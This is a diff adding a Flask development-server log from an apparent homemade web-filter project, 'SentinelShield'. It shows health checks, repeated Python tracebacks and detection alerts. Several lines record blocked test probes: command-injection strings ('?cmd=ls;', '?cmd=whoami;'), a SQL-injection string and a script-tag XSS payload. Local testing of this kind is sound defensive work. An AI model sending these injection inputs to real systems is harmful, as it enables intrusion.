@@ -1,0 +1,1233 @@
+2026-02-05 11:24:01,807 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 11:24:01,807 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 11:25:55,397 | INFO | 127.0.0.1 - - [05/Feb/2026 11:25:55] "GET /health HTTP/1.1" 200 -
+2026-02-05 11:29:17,627 | INFO | 127.0.0.1 - - [05/Feb/2026 11:29:17] "GET /health HTTP/1.1" 200 -
+2026-02-05 11:29:36,228 | INFO | 127.0.0.1 - - [05/Feb/2026 11:29:36] "GET /routes HTTP/1.1" 200 -
+2026-02-05 11:54:53,132 | INFO | 127.0.0.1 - - [05/Feb/2026 11:54:53] "[33mGET /metrics HTTP/1.1[0m" 404 -
+2026-02-05 11:59:34,618 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 11:59:34,619 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 11:59:48,133 | INFO | 127.0.0.1 - - [05/Feb/2026 11:59:48] "GET / HTTP/1.1" 200 -
+2026-02-05 11:59:49,116 | INFO | 127.0.0.1 - - [05/Feb/2026 11:59:49] "GET / HTTP/1.1" 200 -
+2026-02-05 12:00:00,807 | INFO | 127.0.0.1 - - [05/Feb/2026 12:00:00] "GET /health HTTP/1.1" 200 -
+2026-02-05 12:00:19,902 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 12:00:19,902 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 12:00:30,756 | INFO | 127.0.0.1 - - [05/Feb/2026 12:00:30] "GET /health HTTP/1.1" 200 -
+2026-02-05 12:00:31,248 | INFO | 127.0.0.1 - - [05/Feb/2026 12:00:31] "GET /health HTTP/1.1" 200 -
+2026-02-05 12:00:31,471 | INFO | 127.0.0.1 - - [05/Feb/2026 12:00:31] "GET /health HTTP/1.1" 200 -
+2026-02-05 12:00:31,659 | INFO | 127.0.0.1 - - [05/Feb/2026 12:00:31] "GET /health HTTP/1.1" 200 -
+2026-02-05 12:05:26,112 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 12:05:26,112 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 12:06:43,354 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 12:06:43,354 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 12:06:50,413 | INFO | 127.0.0.1 GET /health 200
+2026-02-05 12:06:50,414 | INFO | 127.0.0.1 - - [05/Feb/2026 12:06:50] "GET /health HTTP/1.1" 200 -
+2026-02-05 12:23:31,571 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 12:23:31,571 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 12:23:36,987 | INFO | 127.0.0.1 GET /health 200
+2026-02-05 12:23:36,988 | INFO | 127.0.0.1 - - [05/Feb/2026 12:23:36] "GET /health HTTP/1.1" 200 -
+2026-02-05 18:40:31,332 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 18:40:31,335 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 18:40:36,920 | INFO | 127.0.0.1 GET /health 200
+2026-02-05 18:40:36,921 | INFO | 127.0.0.1 - - [05/Feb/2026 18:40:36] "GET /health HTTP/1.1" 200 -
+2026-02-05 18:40:55,347 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/
+2026-02-05 18:40:55,348 | INFO | 127.0.0.1 GET / 403
+2026-02-05 18:40:55,349 | INFO | 127.0.0.1 - - [05/Feb/2026 18:40:55] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-05 19:02:24,856 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-05 19:02:24,857 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-05 19:03:05,310 | INFO | 127.0.0.1 GET /health 200
+2026-02-05 19:03:05,312 | INFO | 127.0.0.1 - - [05/Feb/2026 19:03:05] "GET /health HTTP/1.1" 200 -
+2026-02-05 19:03:30,233 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/
+2026-02-05 19:03:30,233 | INFO | 127.0.0.1 GET / 403
+2026-02-05 19:03:30,234 | INFO | 127.0.0.1 - - [05/Feb/2026 19:03:30] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-05 19:03:40,977 | INFO | 127.0.0.1 GET /health 200
+2026-02-05 19:03:40,980 | INFO | 127.0.0.1 - - [05/Feb/2026 19:03:40] "GET /health HTTP/1.1" 200 -
+2026-02-05 19:06:51,643 | INFO | 127.0.0.1 GET /health 200
+2026-02-05 19:06:51,644 | INFO | 127.0.0.1 - - [05/Feb/2026 19:06:51] "GET /health HTTP/1.1" 200 -
+2026-02-05 19:11:58,800 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-05 19:11:58,801 | INFO | 127.0.0.1 - - [05/Feb/2026 19:11:58] "GET /metrics HTTP/1.1" 200 -
+2026-02-05 19:12:15,336 | INFO | 127.0.0.1 GET /dashboard 200
+2026-02-05 19:12:15,337 | INFO | 127.0.0.1 - - [05/Feb/2026 19:12:15] "GET /dashboard HTTP/1.1" 200 -
+2026-02-09 22:49:16,605 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-09 22:49:16,608 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-09 22:49:38,492 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/
+2026-02-09 22:49:38,494 | INFO | 127.0.0.1 GET / 403
+2026-02-09 22:49:38,495 | INFO | 127.0.0.1 - - [09/Feb/2026 22:49:38] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-09 22:49:38,573 | INFO | 127.0.0.1 GET /favicon.ico 404
+2026-02-09 22:49:38,574 | INFO | 127.0.0.1 - - [09/Feb/2026 22:49:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2026-02-09 22:49:54,800 | INFO | 127.0.0.1 GET /health 200
+2026-02-09 22:49:54,801 | INFO | 127.0.0.1 - - [09/Feb/2026 22:49:54] "GET /health HTTP/1.1" 200 -
+2026-02-11 16:07:34,126 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-11 16:07:34,127 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-11 16:07:53,313 | INFO | 127.0.0.1 GET /health 200
+2026-02-11 16:07:53,315 | INFO | 127.0.0.1 - - [11/Feb/2026 16:07:53] "GET /health HTTP/1.1" 200 -
+2026-02-11 16:08:18,404 | INFO | 127.0.0.1 GET /health 200
+2026-02-11 16:08:18,405 | INFO | 127.0.0.1 - - [11/Feb/2026 16:08:18] "GET /health HTTP/1.1" 200 -
+2026-02-11 16:08:43,081 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-11 16:08:43,082 | INFO | 127.0.0.1 - - [11/Feb/2026 16:08:43] "GET /metrics HTTP/1.1" 200 -
+2026-02-11 16:10:01,722 | INFO | 127.0.0.1 GET /health 200
+2026-02-11 16:10:01,723 | INFO | 127.0.0.1 - - [11/Feb/2026 16:10:01] "GET /health HTTP/1.1" 200 -
+2026-02-11 16:11:08,819 | INFO | 127.0.0.1 GET /dashboard 200
+2026-02-11 16:11:08,821 | INFO | 127.0.0.1 - - [11/Feb/2026 16:11:08] "GET /dashboard HTTP/1.1" 200 -
+2026-02-11 16:28:46,399 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/?cmd=ls;
+2026-02-11 16:28:46,401 | INFO | 127.0.0.1 GET / 403
+2026-02-11 16:28:46,402 | INFO | 127.0.0.1 - - [11/Feb/2026 16:28:46] "[31m[1mGET /?cmd=ls; HTTP/1.1[0m" 403 -
+2026-02-11 16:51:23,723 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-11 16:51:23,724 | INFO | 127.0.0.1 - - [11/Feb/2026 16:51:23] "GET /metrics HTTP/1.1" 200 -
+2026-02-11 16:51:51,701 | INFO | 127.0.0.1 GET /dashboard 200
+2026-02-11 16:51:51,703 | INFO | 127.0.0.1 - - [11/Feb/2026 16:51:51] "GET /dashboard HTTP/1.1" 200 -
+2026-02-11 16:52:14,458 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/?cmd=whoami;
+2026-02-11 16:52:14,459 | INFO | 127.0.0.1 GET / 403
+2026-02-11 16:52:14,460 | INFO | 127.0.0.1 - - [11/Feb/2026 16:52:14] "[31m[1mGET /?cmd=whoami; HTTP/1.1[0m" 403 -
+2026-02-11 18:58:18,663 | INFO | 127.0.0.1 GET /health 200
+2026-02-11 18:58:18,666 | INFO | 127.0.0.1 - - [11/Feb/2026 18:58:18] "GET /health HTTP/1.1" 200 -
+2026-02-11 19:35:50,747 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-11 19:35:50,747 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-11 19:35:59,654 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/?cmd=ls;
+2026-02-11 19:35:59,655 | INFO | 127.0.0.1 GET / 403
+2026-02-11 19:35:59,656 | INFO | 127.0.0.1 - - [11/Feb/2026 19:35:59] "[31m[1mGET /?cmd=ls; HTTP/1.1[0m" 403 -
+2026-02-11 19:36:48,883 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/
+2026-02-11 19:36:48,884 | INFO | 127.0.0.1 GET / 403
+2026-02-11 19:36:48,885 | INFO | 127.0.0.1 - - [11/Feb/2026 19:36:48] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-11 19:37:16,580 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-11 19:37:16,581 | INFO | 127.0.0.1 - - [11/Feb/2026 19:37:16] "GET /metrics HTTP/1.1" 200 -
+2026-02-11 19:51:45,094 | WARNING | ALERT: SQL Injection detected from 127.0.0.1 | http://127.0.0.1:5000/?id=1%20OR%201=1--
+2026-02-11 19:51:45,095 | INFO | 127.0.0.1 GET / 403
+2026-02-11 19:51:45,096 | INFO | 127.0.0.1 - - [11/Feb/2026 19:51:45] "[31m[1mGET /?id=1%20OR%201=1-- HTTP/1.1[0m" 403 -
+2026-02-11 19:51:54,099 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-11 19:51:54,100 | INFO | 127.0.0.1 - - [11/Feb/2026 19:51:54] "GET /metrics HTTP/1.1" 200 -
+2026-02-11 19:51:58,004 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/
+2026-02-11 19:51:58,005 | INFO | 127.0.0.1 GET / 403
+2026-02-11 19:51:58,005 | INFO | 127.0.0.1 - - [11/Feb/2026 19:51:58] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-11 19:52:02,947 | WARNING | ALERT: Command Injection detected from 127.0.0.1 | http://127.0.0.1:5000/?cmd=ls;
+2026-02-11 19:52:02,948 | CRITICAL | AUTO-BAN: 127.0.0.1 banned for 600 seconds
+2026-02-11 19:52:02,948 | INFO | 127.0.0.1 GET / 403
+2026-02-11 19:52:02,949 | INFO | 127.0.0.1 - - [11/Feb/2026 19:52:02] "[31m[1mGET /?cmd=ls; HTTP/1.1[0m" 403 -
+2026-02-11 19:52:39,750 | WARNING | BLOCKED: Banned IP tried access: 127.0.0.1
+2026-02-11 19:52:39,751 | INFO | 127.0.0.1 GET / 403
+2026-02-11 19:52:39,751 | INFO | 127.0.0.1 - - [11/Feb/2026 19:52:39] "[31m[1mGET /?search=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-11 19:54:59,997 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-11 19:54:59,998 | INFO | 127.0.0.1 - - [11/Feb/2026 19:54:59] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 09:00:12,823 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 09:00:12,825 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 09:00:28,908 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 09:00:28,909 | INFO | 127.0.0.1 - - [12/Feb/2026 09:00:28] "GET /health HTTP/1.1" 200 -
+2026-02-12 09:02:06,809 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 178, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() got an unexpected keyword argument 'reason'
+2026-02-12 09:02:06,817 | INFO | 127.0.0.1 GET / 500
+2026-02-12 09:02:06,818 | INFO | 127.0.0.1 - - [12/Feb/2026 09:02:06] "[35m[1mGET /?search=<script>alert(1)</script> HTTP/1.1[0m" 500 -
+2026-02-12 09:02:23,991 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 09:02:23,992 | INFO | 127.0.0.1 - - [12/Feb/2026 09:02:23] "GET /health HTTP/1.1" 200 -
+2026-02-12 09:02:38,535 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 09:02:38,535 | INFO | 127.0.0.1 - - [12/Feb/2026 09:02:38] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 09:14:33,101 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 09:14:33,102 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 09:15:15,818 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 178, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() got an unexpected keyword argument 'endpoint'
+2026-02-12 09:15:15,822 | INFO | 127.0.0.1 GET / 500
+2026-02-12 09:15:15,823 | INFO | 127.0.0.1 - - [12/Feb/2026 09:15:15] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 09:15:31,537 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 09:15:31,538 | INFO | 127.0.0.1 - - [12/Feb/2026 09:15:31] "GET /health HTTP/1.1" 200 -
+2026-02-12 09:15:34,672 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 09:15:34,673 | INFO | 127.0.0.1 - - [12/Feb/2026 09:15:34] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 09:32:30,309 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 09:32:30,309 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 09:32:47,567 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 178, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-12 09:32:47,572 | INFO | 127.0.0.1 GET / 500
+2026-02-12 09:32:47,572 | INFO | 127.0.0.1 - - [12/Feb/2026 09:32:47] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 09:32:58,017 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 09:32:58,018 | INFO | 127.0.0.1 - - [12/Feb/2026 09:32:58] "GET /health HTTP/1.1" 200 -
+2026-02-12 09:33:14,003 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 09:33:14,003 | INFO | 127.0.0.1 - - [12/Feb/2026 09:33:14] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 09:35:29,830 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 09:35:29,831 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 09:35:42,141 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 178, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-12 09:35:42,144 | INFO | 127.0.0.1 GET / 500
+2026-02-12 09:35:42,145 | INFO | 127.0.0.1 - - [12/Feb/2026 09:35:42] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 09:35:52,247 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 09:35:52,248 | INFO | 127.0.0.1 - - [12/Feb/2026 09:35:52] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 09:37:52,989 | INFO | 127.0.0.1 GET /unban 404
+2026-02-12 09:37:52,990 | INFO | 127.0.0.1 - - [12/Feb/2026 09:37:52] "[33mGET /unban HTTP/1.1[0m" 404 -
+2026-02-12 11:14:48,559 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 11:14:48,560 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 11:15:01,347 | INFO | 127.0.0.1 GET /unban 200
+2026-02-12 11:15:01,349 | INFO | 127.0.0.1 - - [12/Feb/2026 11:15:01] "GET /unban HTTP/1.1" 200 -
+2026-02-12 11:23:41,211 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 178, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-12 11:23:41,215 | INFO | 127.0.0.1 GET / 500
+2026-02-12 11:23:41,216 | INFO | 127.0.0.1 - - [12/Feb/2026 11:23:41] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 11:23:53,736 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 11:23:53,736 | INFO | 127.0.0.1 - - [12/Feb/2026 11:23:53] "GET /health HTTP/1.1" 200 -
+2026-02-12 11:24:16,267 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 11:24:16,268 | INFO | 127.0.0.1 - - [12/Feb/2026 11:24:16] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 11:42:03,051 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 11:42:03,051 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 11:42:06,178 | INFO | 127.0.0.1 GET /unban 200
+2026-02-12 11:42:06,179 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:06] "GET /unban HTTP/1.1" 200 -
+2026-02-12 11:42:09,117 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 184, in sentinel_shield
+    timestamp=datetime.utcnow(),
+              ^^^^^^^^^^^^^^^
+AttributeError: module 'datetime' has no attribute 'utcnow'
+2026-02-12 11:42:09,120 | INFO | 127.0.0.1 GET / 500
+2026-02-12 11:42:09,120 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:09] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 11:42:09,712 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 184, in sentinel_shield
+    timestamp=datetime.utcnow(),
+              ^^^^^^^^^^^^^^^
+AttributeError: module 'datetime' has no attribute 'utcnow'
+2026-02-12 11:42:09,714 | INFO | 127.0.0.1 GET / 500
+2026-02-12 11:42:09,715 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:09] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 11:42:09,928 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 184, in sentinel_shield
+    timestamp=datetime.utcnow(),
+              ^^^^^^^^^^^^^^^
+AttributeError: module 'datetime' has no attribute 'utcnow'
+2026-02-12 11:42:09,929 | INFO | 127.0.0.1 GET / 500
+2026-02-12 11:42:09,930 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:09] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 11:42:13,073 | INFO | 127.0.0.1 GET /health 200
